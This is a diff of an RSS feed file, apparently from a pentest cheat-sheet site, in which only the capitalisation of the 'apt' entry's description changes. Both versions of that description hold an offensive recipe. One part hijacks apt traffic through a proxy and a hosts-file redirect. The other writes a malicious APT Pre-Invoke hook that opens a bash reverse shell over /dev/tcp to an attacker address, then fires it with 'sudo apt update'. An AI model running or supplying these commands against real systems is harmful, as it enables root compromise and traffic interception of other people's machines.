@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/apt/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apt/</guid>
-      <description>MITM (Man-in-the-Middle) 1. Add proxy path in target machine export http_proxy=http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PROXY_PORT&amp;gt; 2. Start proxy in local machine # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port &amp;lt;LOCAL_PROXY_PORT&amp;gt; 3. Redirect traffic to our server # Edit /etc/hosts in target machine &amp;lt;LOCAL_IP&amp;gt; apt.update.example.com SUDO 1. Create a malicious config echo &amp;#39;APT::Update::Pre-Invoke {&amp;#34;bash -c &amp;#39;\&amp;#39;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/&amp;lt;LOCAL_PORT&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#39;&amp;#39;&amp;#34;}&amp;#39; &amp;gt; /etc/apt/apt.conf.d/evil 2. Exploit sudo apt update -y </description>
+      <description>MITM (Man-in-the-Middle) 1. Add Proxy Path in Target Machine export http_proxy=http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PROXY_PORT&amp;gt; 2. Start Proxy in Local Machine # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port &amp;lt;LOCAL_PROXY_PORT&amp;gt; 3. Redirect Traffic to Our Server # Edit /etc/hosts in target machine &amp;lt;LOCAL_IP&amp;gt; apt.update.example.com SUDO 1. Create a Malicious Config echo &amp;#39;APT::Update::Pre-Invoke {&amp;#34;bash -c &amp;#39;\&amp;#39;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/&amp;lt;LOCAL_PORT&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#39;&amp;#39;&amp;#34;}&amp;#39; &amp;gt; /etc/apt/apt.conf.d/evil 2. Exploit sudo apt update -y </description>
     </item>
   </channel>
 </rss>
